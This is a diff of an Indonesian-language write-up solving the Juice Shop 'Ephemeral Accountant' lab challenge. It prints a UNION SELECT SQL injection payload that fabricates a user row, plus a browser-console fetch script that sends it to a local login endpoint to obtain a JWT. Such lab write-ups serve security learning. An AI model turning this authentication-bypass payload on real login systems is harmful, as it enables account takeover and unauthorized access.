@@ -1,19 +1,17 @@
-
 ## Penyelesaian Tantangan: Ephemeral Accountant
 
-### Deskripsi Tantangan
-Tantangan ini menuntut saya untuk masuk sebagai pengguna yang tidak ada (`acc0unt4nt@juice-sh.op`) tanpa mendaftarkannya terlebih dahulu. Pengguna ini harus "diciptakan" secara sementara hanya selama proses login.
+### Misi Tantangan
+Pada tantangan ini, saya diharuskan untuk melakukan login menggunakan akun pengguna yang sebenarnya tidak ada (`acc0unt4nt@juice-sh.op`) tanpa melalui proses registrasi. Inti dari tantangan ini adalah merekayasa keberadaan pengguna tersebut secara virtual, khusus pada saat proses autentikasi berlangsung.
 
-### Strategi dan Eksekusi Serangan
+### Metodologi dan Implementasi Serangan
 
-#### Analisis Fungsionalitas
-Saya mengidentifikasi endpoint `POST /rest/user/login` sebagai target. Tujuan saya adalah menyuntikkan SQL melalui body JSON dari permintaan ini.
+#### Penentuan Target Serangan
+Saya memfokuskan analisis pada *endpoint* `POST /rest/user/login` sebagai target utama. Tujuannya adalah untuk menyisipkan perintah SQL berbahaya melalui *body* permintaan yang berformat JSON.
 
-#### Menyusun Payload SQL Injection
-Karena akun tidak ada, saya menggunakan strategi `UNION SELECT` SQL Injection untuk membuat baris data pengguna palsu secara temporer. Payload ini dirancang untuk meniru struktur data pengguna yang sah, lengkap dengan email, password, dan role yang diperlukan.
+#### Perancangan Muatan Injeksi SQL
+Mengingat akun target tidak terdaftar di dalam basis data, strategi yang paling efektif adalah menggunakan serangan *SQL Injection* jenis `UNION SELECT`. Pendekatan ini memungkinkan saya untuk menciptakan sebuah baris data pengguna palsu secara *on-the-fly*. Muatan (*payload*) ini dirancang sedemikian rupa agar strukturnya identik dengan data pengguna yang sah, mencakup informasi seperti email, kata sandi, dan peran (*role*) yang dibutuhkan.
 
-Berikut adalah payload yang digunakan:
-
+Berikut adalah muatan JSON yang saya gunakan:
 ```json
 {
   "email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
@@ -21,11 +19,10 @@ Berikut adalah payload yang digunakan:
 }
 ```
 
-#### Eksekusi Serangan dengan Konsol Peramban
-saya menggunakan fungsi `fetch` di console. Metode ini efektif karena dapat menangani objek JSON dengan sempurna.
+#### Pengiriman Muatan via Konsol
+Untuk mengeksekusi serangan, saya memanfaatkan fungsi `fetch` yang tersedia di dalam konsol peramban. Metode ini terbukti sangat andal karena kemampuannya dalam menangani pengiriman objek JSON secara langsung dan efisien.
 
-Kode yang berhasil:
-
+Skrip eksekusi yang berhasil adalah sebagai berikut:
 ```javascript
 fetch('http://127.0.0.1:3000/rest/user/login', {
     method: 'POST',
@@ -39,9 +36,10 @@ fetch('http://127.0.0.1:3000/rest/user/login', {
 });
 ```
 
-### Analisis Hasil
-Serangan SQL Injection ini berhasil menciptakan data pengguna sementara selama proses login berlangsung. Aplikasi mengolah data ini seolah-olah berasal dari database yang valid, dan memberikan token JWT yang menandakan keberhasilan login. Hal ini menunjukkan kerentanan serius dalam mekanisme otentikasi.
+### Evaluasi Keberhasilan Serangan
+Serangan *SQL Injection* ini terbukti sukses dalam menciptakan data pengguna virtual selama eksekusi proses login. Aplikasi target terkecoh dan memproses data rekayasa tersebut seolah-olah berasal dari sumber yang valid di dalam basis data. Akibatnya, sistem memberikan sebuah token JWT (*JSON Web Token*) sebagai tanda autentikasi yang berhasil. Insiden ini mengungkap adanya kerentanan yang sangat serius pada mekanisme autentikasi aplikasi.
 
 ### Bukti 
 <img width="1861" height="958" alt="Screenshot 2025-09-09 225759" src="https://github.com/user-attachments/assets/d3dee9ea-7b12-4940-a7d1-2b78430f6509" />
+
 
